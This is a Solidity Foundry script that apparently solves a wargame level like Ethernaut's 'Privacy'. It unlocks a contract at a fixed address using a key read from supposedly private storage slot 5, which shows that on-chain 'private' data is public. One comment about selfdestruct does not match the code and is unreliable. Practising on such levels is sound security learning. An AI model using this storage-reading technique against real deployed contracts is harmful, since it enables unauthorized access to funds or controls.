// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import "forge-std/Script.sol";
import "../src/Attacker.sol";
import "../src/Contract.sol";
import "forge-std/console.sol";

contract AttackScript is Script {
    function setUp() public {}

    //solveed by using the selfdestruct() to send ether to another contract
    function run() public {
        vm.startBroadcast();

        Privacy privacyContract = Privacy(
            0x42d456038445cA6bdA8E1C8f95E3212FA81E5763
        );

        //valid _key is in storage slot 5 of privacyContract
        //read it via await web3.eth.getStorageAt('0x42d456038445cA6bdA8E1C8f95E3212FA81E5763', 5)
        bytes16 key = convertToBytes16(
            0x5ba2e810ca2bf3551081974fd1827ab28894e9ac67304f46d033b4eaf4bc9bc4
        );

        privacyContract.unlock(key);

        vm.stopBroadcast();
    }

    function convertToBytes16(bytes32 str) public view returns (bytes16) {
        return bytes16(str);
    }
}
